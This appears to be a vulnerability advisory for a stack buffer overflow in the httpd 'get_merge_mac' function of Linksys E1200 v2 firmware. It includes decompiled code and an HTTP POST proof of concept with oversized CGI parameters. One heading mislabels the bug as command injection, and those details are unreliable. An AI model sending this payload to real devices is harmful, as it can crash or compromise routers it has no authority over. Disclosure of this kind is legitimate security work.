# Buffer Overflow Vulnerability in `get_merge_mac`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Linksys E1200 v2 Router                                      |
| Firmware Version     | **E1200_v2.0.11.001_us.tar.gz**                              |
| Vulnerability Type   | **Stack-Based Buffer Overflow**                              |
| Vulnerable Component | `httpd` (function `get_merge_mac`, buffer `a2`)              |
| Prerequisites        | No authentication required; remote exploitation possible via CGI parameters matching `<parameter>_0~5` |

2. Exploitation Path

```c
int __fastcall get_merge_mac(const char *a1, char *a2)
{
  int v4; // $s2
  const char *cgi; // $v0
  const char *v6; // $s0
  char *v8; // $v0
  char v9[32]; // [sp+20h] [-20h] BYREF

  *a2 = 0;
  v4 = 0;
  do
  {
    snprintf(v9, 0x1Eu, "%s_%d", a1, v4);
    cgi = (const char *)get_cgi((int)v9);
    v6 = cgi;
    if ( cgi )
    {
      if ( strlen(cgi) == 1 )
        goto LABEL_9;
    }
    else
    {
      v6 = "00";
      if ( strlen("00") == 1 )
LABEL_9:
        strcat(a2, "0");
    }
    strcat(a2, v6);
    if ( v4 == 5 )
      break;
    ++v4;
    v8 = &a2[strlen(a2)];
    *v8 = 58;
    v8[1] = 0;
  }
  while ( v4 != 6 );
  return 1;
}
```

3. **Vulnerable Binaries:** `httpd`.
4. 0-Day Command Injection Exploitation Path: In the `httpd` file, at line 14, `cgi = (const char *)get_cgi((int)v9)` receives data via `get_cgi` without any length restriction. A loop of 6 iterations performs string concatenation at line 28 with `strcat(a2, v6)`. An attacker can send specially crafted CGI parameters, resulting in a buffer overflow vulnerability.
5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/get_merge_mac HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 600

param_0=AAAAAAAAAAAAAAAAAAAA&param_1=BBBBBBBBBBBBBBBBBBBB&param_2=CCCCCCCCCCCCCCCCCCCC&param_3=DDDDDDDDDDDDDDDDDDDD&
param_4=EEEEEEEEEEEEEEEEEEEE&param_5=FFFFFFFFFFFFFFFFFFFF
```